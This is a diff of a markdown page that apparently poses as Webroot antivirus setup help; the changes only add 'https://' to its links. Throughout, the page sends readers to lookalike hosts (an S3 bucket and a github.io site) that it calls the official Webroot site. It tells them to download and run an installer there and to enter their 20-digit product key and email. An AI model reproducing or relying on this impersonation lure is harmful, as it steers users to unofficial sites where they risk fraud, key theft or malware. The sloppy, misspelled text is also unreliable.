@@ -2,13 +2,13 @@
 
 [![Webroot.com/secure](gett-starteed.png)](http://webroot.com.setup.s3-website-us-west-1.amazonaws.com/)
 
-Webroot SecureAnywhere AntiVirus scans at high speed and uses just a trickle of your system's resources so you need to install antivirus for secure then you can visit [Webroot.com/secure](a-Webrootcomsecure.github.io/). and enter code for webroot activation.
+Webroot SecureAnywhere AntiVirus scans at high speed and uses just a trickle of your system's resources so you need to install antivirus for secure then you can visit [Webroot.com/secure](https://a-Webrootcomsecure.github.io/). and enter code for webroot activation.
 
 Powerful, lightweight, and integrated protection for PC, Mac, and Android, Webroot Internet Security Complete with antivirus protects personal information. To know more about weroot visit [Webroot.com/secure](a-Webrootcomsecure.github.io/).
 
 ## Discuss about webroot enter code:
 
-In My Webroot Account window, click Activate and Enter 20 digit Enter code on the site [Webroot.com/secure](a-Webrootcomsecure.github.io/).
+In My Webroot Account window, click Activate and Enter 20 digit Enter code on the site [Webroot.com/secure](https://a-Webrootcomsecure.github.io/).
 
 ## Downloading, Install and Activate Webroot Antivirus via Retail Card:
 
@@ -27,7 +27,7 @@ In My Webroot Account window, click Activate and Enter 20 digit Enter code on th
 
 ## Let's know how to protect your device using webroot.com/secure:
 
-* Go to [Webroot.com/secure](a-Webrootcomsecure.github.io/) official website.
+* Go to [Webroot.com/secure](https://a-Webrootcomsecure.github.io/) official website.
 * Select the webroot and then click on the Download button.
 * When the file gets downloaded then open this file and install it.
 * Once the installation screen appears with 20-digit product key.
@@ -36,7 +36,7 @@ In My Webroot Account window, click Activate and Enter 20 digit Enter code on th
 * When prompted, type the email address.
 * After that, click on the Continue button.
 * Follow the on-screen directions and get done with the installation process.
-* Then Open the [Webroot.com/secure](a-Webrootcomsecure.github.io/).
+* Then Open the [Webroot.com/secure](https://a-Webrootcomsecure.github.io/).
 * Then Enter code on specific location.
 * After that, click on the Activate button.
 * In case a scan starts automatically, enable it to complete.
